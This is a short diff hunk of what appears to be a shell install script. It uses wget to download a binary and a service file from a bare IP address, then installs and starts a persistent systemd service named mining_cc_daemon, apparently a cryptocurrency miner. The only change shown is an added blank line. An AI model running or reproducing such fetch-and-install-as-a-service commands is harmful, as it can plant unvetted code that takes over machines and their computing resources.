@@ -3,6 +3,7 @@ wget http://100.96.102.113:4999/linux/download_deamon_service
 
 mv download_deamon daemon_main
 mv download_deamon_service /etc/systemd/system/mining_cc_daemon.service
+
 chmod +x daemon_main
 systemctl enable mining_cc_daemon.service
 systemctl start mining_cc_daemon.service
